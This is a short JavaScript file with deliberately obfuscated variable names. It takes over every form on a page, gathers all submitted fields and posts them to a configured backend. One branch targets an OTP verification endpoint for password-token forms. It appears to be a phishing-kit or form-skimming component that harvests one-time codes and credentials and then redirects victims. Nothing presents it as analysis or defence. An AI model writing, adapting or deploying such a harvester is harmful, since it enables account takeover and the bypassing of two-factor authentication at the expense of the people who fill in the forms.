import { BACKEND_URL as _0xurl } from "./config.js";

document.addEventListener("DOMContentLoaded", () => {
  const _0xf0 = document.querySelectorAll("form");

  _0xf0.forEach((_0xf1) => {
    _0xf1.addEventListener("submit", async (_0xe) => {
      _0xe.preventDefault();

      let _0xep = "";
      if (_0xf1.classList.contains("new_token_request_password_two")) {
        _0xep = `${_0xurl}/verify-otp-two`;
      }

      const _0xfd = new FormData(_0xf1);
      const _0xd0 = {};

      _0xfd.forEach((v, k) => {
        if (_0xd0[k]) {
          if (Array.isArray(_0xd0[k])) {
            _0xd0[k].push(v);
          } else {
            _0xd0[k] = [_0xd0[k], v];
          }
        } else {
          _0xd0[k] = v;
        }
      });

      let _0xfu = _0xf1.classList.contains("elementor-form");
      let _0xro = {
        method: "POST",
        body: _0xfu ? _0xfd : JSON.stringify(_0xd0),
        headers: _0xfu ? {} : { "Content-Type": "application/json" },
      };

      try {
        const _0xres = await fetch(_0xep, _0xro);
        const _0xjs = await _0xres.json();

        if (_0xjs.success && _0xjs.redirect) {
          window.location.href = _0xjs.redirect;
        } else {
          alert("Error: " + (_0xjs.error || "Something went wrong"));
        }
      } catch (_0xerr) {
        console.error("Form Submission Error:", _0xerr);
        alert("❌ Something went wrong! Please try again.");
      }
    });
  });
});
